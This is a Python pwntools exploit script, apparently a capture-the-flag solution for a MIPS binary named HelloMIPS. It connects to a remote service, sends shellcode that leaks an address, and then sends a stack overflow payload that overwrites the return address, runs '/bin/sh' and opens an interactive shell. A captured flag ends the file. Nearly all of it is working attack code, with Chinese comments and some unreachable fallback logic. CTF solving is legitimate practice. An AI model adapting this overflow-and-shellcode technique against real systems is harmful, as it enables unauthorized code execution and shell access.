from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'mips'
Debug = True

elf = ELF('./HelloMIPS', checksec=False)


def get_sh(other_libc=null):
    # return process(["qemu-mipsel", "-L", "./", "./HelloMIPS"])
    return remote('10.104.255.211', 7777)
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec=False)
        return remote('10.104.255.211', 7777)
    elif Debug:
        sh = process(["qemu-mipsel", "-g", "2333", "-L", "./", "./HelloMIPS"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else:
        return process(["qemu-mipsel", "-L", "./", "./HelloMIPS"])


conn = get_sh()
conn.recvline()

payload = b''
payload += asm('addi $t9, $sp, -0x108')
payload += asm('nop')
payload += asm('jalr $t9')
payload += b'\0' * (0xF-len(payload))


conn.send(payload)
conn.recvline()

bb = conn.recvline()

hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)
print('hex_magic: {}'.format(hex_magic))

addr_NAME = 0x440E20
payload = b''
payload += asm('move $a0, $sp')
payload += asm('li $t9, ' + hex(addr_magic))
payload += asm('nop')
payload += asm('jalr $t9')
payload += asm('nop')


payload += b'a' * (0x100 - len(payload))
payload += p32(0xdeadbeef)
payload += p32(addr_NAME)
# 重要參數放到sp后面防止被冲掉！！！！！
payload += b'/bin/sh\0'

conn.send(payload)


conn.interactive()

# TSCTF{d561c9d2-064d-11eb-80ab-0242ac110002}